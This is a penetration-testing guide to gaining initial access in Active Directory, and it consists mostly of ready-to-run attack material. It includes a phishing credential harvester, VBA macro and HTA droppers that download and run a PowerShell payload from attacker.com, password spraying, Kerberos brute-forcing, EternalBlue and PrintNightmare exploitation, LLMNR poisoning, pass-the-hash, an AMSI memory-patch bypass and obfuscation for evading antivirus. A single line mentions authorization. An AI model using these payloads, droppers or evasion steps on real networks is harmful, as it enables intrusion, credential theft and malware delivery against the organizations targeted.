# Gaining Initial Access in Active Directory Penetration Testing

## Overview
Gaining initial access involves exploiting vulnerabilities, misconfigurations, or social engineering to obtain a foothold in the AD environment, typically through credentials, service exploits, or network attacks.

## Detailed Methods and Techniques
- **Phishing for Credentials**:
  - **Technique**: Send targeted phishing emails to capture AD credentials, leveraging OSINT data (e.g., employee names from LinkedIn).
    - **Execution**: Use `SET` to create a fake AD login page.
      ```bash
      setoolkit
      # Select: 1) Social-Engineering Attacks
      # Select: 2) Website Attack Vectors
      # Select: 3) Credential Harvester Attack
      # Clone: https://owa.example.com
      ```
      **Example Output**:
      ```
      [+] Credential captured:
      Username: jdoe@example.com
      Password: P@ssw0rd123
      ```
    - **Purpose**: Obtain valid AD credentials for authentication.
  - **Technique**: Spear-phishing with malicious attachments (e.g., macro-enabled Office documents).
    - **Execution**: Create a VBA macro to execute a PowerShell payload.
      ```vba
      Sub AutoOpen()
          Shell "powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1'))"
      End Sub
      ```
      **Example Output**: Establishes a Meterpreter session.
      ```
      [*] Meterpreter session 1 opened
      ```
    - **Purpose**: Gain a shell on the victim’s system.
  - **Technique**: HTML Application (HTA) phishing for direct code execution.
    - **Execution**: Host an HTA file that executes a PowerShell payload.
      ```html
      <script language="VBScript">
      Set WShell = CreateObject("WScript.Shell")
      WShell.Run "powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1'))"
      </script>
      ```
      **Example Output**: Executes payload and opens a reverse shell.
    - **Purpose**: Bypass traditional email filters for direct execution.
- **Password Spraying**:
  - **Technique**: Attempt common passwords against multiple accounts to avoid lockouts.
    - **Execution**: Use `CrackMapExec` for password spraying.
      ```bash
      crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123
      ```
      **Example Output**:
      ```
      SMB 192.168.1.10 445 DC01 [+] example.com\jsmith:Password123
      SMB 192.168.1.20 445 SRV01 [+] example.com\jdoe:Password123
      ```
    - **Purpose**: Identify accounts with weak passwords.
  - **Technique**: Brute-forcing via Kerberos pre-authentication.
    - **Execution**: Use `Kerbrute`.
      ```bash
      kerbrute bruteuser -d example.com --dc 192.168.1.10 jdoe passwords.txt
      ```
      **Example Output**:
      ```
      [+] VALID LOGIN: jdoe@EXAMPLE.COM:Password123
      ```
    - **Purpose**: Gain access to accounts with weak passwords.
- **Exploiting Service Vulnerabilities**:
  - **Technique**: Exploit known vulnerabilities in AD-related services (e.g., SMBv1 with EternalBlue, MS17-010).
    - **Execution**: Use Metasploit for EternalBlue.
      ```bash
      msfconsole
      use exploit/windows/smb/ms17_010_eternalblue
      set RHOSTS 192.168.1.10
      set PAYLOAD windows/x64/meterpreter/reverse_tcp
      set LHOST 192.168.1.100
      exploit
      ```
      **Example Output**:
      ```
      [*] Meterpreter session 1 opened
      ```
    - **Purpose**: Gain a shell on a vulnerable AD server.
  - **Technique**: Exploit PrintNightmare (CVE-2021-34527) to gain SYSTEM access.
    - **Execution**: Use a public exploit like `PrintNightmare.py`.
      ```bash
      python3 PrintNightmare.py example.com/user:password@192.168.1.10
      ```
      **Example Output**:
      ```
      [+] Exploit successful, SYSTEM shell obtained
      ```
    - **Purpose**: Escalate to SYSTEM on a print server.
- **LLMNR/NBT-NS Poisoning**:
  - **Technique**: Spoof LLMNR/NBT-NS responses to capture NTLM hashes.
    - **Execution**: Use `Responder`.
      ```bash
      responder -I eth0
      ```
      **Example Output**:
      ```
      [+] [LLMNR] Poisoned answer sent to 192.168.1.20 for name SRV01
      NTLMv2 hash: jdoe::example:1122334455667788:abcdef1234567890
      ```
    - **Purpose**: Capture NTLM hashes for cracking or pass-the-hash.

## Exploitation Methods
- **Credential Harvesting**:
  - **Technique**: Use captured credentials to authenticate to AD services (e.g., SMB, RDP).
  - **Execution**: Test credentials with `CrackMapExec`.
    ```bash
    crackmapexec smb 192.168.1.10 -u jdoe -p P@ssw0rd123
    ```
    **Example Output**:
    ```
    SMB 192.168.1.10 445 DC01 [+] example.com\jdoe:P@ssw0rd123 (Pwn3d!)
    ```
    - **Purpose**: Access AD resources as a legitimate user.
- **Pass-the-Hash**:
  - **Technique**: Use stolen NTLM hashes to authenticate without the password.
  - **Execution**: Use `psexec.py` from Impacket.
    ```bash
    psexec.py example.com/jdoe@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee
    ```
    **Example Output**:
    ```
    [*] Connected to 192.168.1.10 as jdoe
    ```
    - **Purpose**: Gain access to systems without cracking the hash.
- **Exploit Delivery**:
  - **Technique**: Deliver payloads via exploited services (e.g., EternalBlue).
  - **Execution**: Use Metasploit payload from the EternalBlue exploit (as shown above).
    - **Purpose**: Establish a persistent shell for further attacks.

## AV/AMSI Evasion Techniques
- **Obfuscated Payloads**:
  - **Technique**: Obfuscate PowerShell payloads in phishing attachments to bypass AMSI.
  - **Execution**: Use `Invoke-Obfuscation`.
    ```powershell
    Invoke-Obfuscation -ScriptBlock {IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1'))} -Technique Encode
    ```
    **Example Output**:
    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Prevent AMSI from detecting malicious scripts.
- **In-Memory Execution**:
  - **Technique**: Execute payloads in memory to avoid disk-based AV detection.
  - **Execution**: Use Metasploit’s in-memory payload.
    ```bash
    msfconsole
    use payload/windows/x64/meterpreter/reverse_tcp
    generate -f exe -o payload.exe
    ```
    - **Purpose**: Avoid AV detection by not writing to disk.
- **AMSI Bypass**:
  - **Technique**: Disable AMSI via memory patching.
  - **Execution**: Use a bypass script.
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
    ```
    - **Purpose**: Prevent PowerShell scripts from being scanned by AMSI.
- **Encrypted C2 Channels**:
  - **Technique**: Use encrypted C2 channels (e.g., HTTPS) for payload delivery.
  - **Execution**: Configure Metasploit with HTTPS.
    ```bash
    msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
    set LHOST 192.168.1.100
    set PAYLOAD windows/x64/meterpreter/reverse_https
    ```
    - **Purpose**: Evade network-based AV/EDR monitoring.

## Tools
- **SET**: Social engineering for phishing (`setoolkit`).
- **CrackMapExec**: Password spraying and credential testing (`crackmapexec smb`).
- **Kerbrute**: Kerberos brute-forcing (`kerbrute bruteuser`).
- **Metasploit**: Exploit framework (`msfconsole`).
- **Impacket**: Pass-the-hash and other attacks (`psexec.py`).
- **Responder**: LLMNR/NBT-NS poisoning.

## Best Practices
- Ensure phishing and exploit tests are authorized and comply with legal guidelines.
- Use minimal attempts during password spraying to avoid account lockouts.
- Document all successful access methods for reporting.
- Use obfuscation and encryption to evade AV/AMSI.